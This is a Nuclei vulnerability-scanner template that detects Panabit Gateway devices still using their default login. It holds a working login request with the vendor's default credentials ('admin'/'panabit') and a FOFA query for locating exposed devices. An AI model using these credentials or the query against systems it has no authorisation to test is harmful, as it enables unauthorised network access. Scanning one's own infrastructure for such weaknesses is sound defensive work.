id: panabit-default-login
info:
  name: Panabit Gateway - Default Login
  author: pikpikcu,ritikchaddha
  severity: critical
  description: The default login credentials for Panabit Gateway were found.
  reference:
  - https://max.book118.com/html/2017/0623/117514590.shtm
  - https://en.panabit.com/wp-content/uploads/Panabit-Intelligent-Application-Gateway-04072020.pdf
  - https://topic.alibabacloud.com/a/panabit-monitoring-installation-tutorial_8_8_20054193.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-1391
  metadata:
    verified: true
    fofa-query: "app=\"Panabit-\u667A\u80FD\u7F51\u5173\""
    impact: The impact of the discovery of Panabit Gateway default credentials is
      that it could allow unauthorized access to the network and compromise sensitive
      information.
    recommendation: It is recommended to change the default login credentials for
      the Panabit Gateway to ensure the security of the system.
  tags: panabit,default-login
requests:
- raw:
  - 'POST /login/userverify.cgi HTTP/1.1

    Host: {{Hostname}}

    Origin: {{BaseURL}}

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAjZMsILtbrBp8VbC

    Referer: {{BaseURL}}/login/login.htm

    Accept-Encoding: gzip, deflate

    Accept-Language: en-GB,en-US;q=0.9,en;q=0.8


    ------WebKitFormBoundaryAjZMsILtbrBp8VbC

    Content-Disposition: form-data; name="username"


    {{username}}

    ------WebKitFormBoundaryAjZMsILtbrBp8VbC

    Content-Disposition: form-data; name="password"


    {{password}}

    ------WebKitFormBoundaryAjZMsILtbrBp8VbC--

    '
  payloads:
    username:
    - admin
    password:
    - panabit
  attack: pitchfork
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - <META HTTP-EQUIV=REFRESH CONTENT="0;URL=/index.htm">
    - urn:schemas-microsoft-com:vml
    condition: and
  - type: word
    part: header
    words:
    - paonline_admin
  - type: status
    status:
    - 200
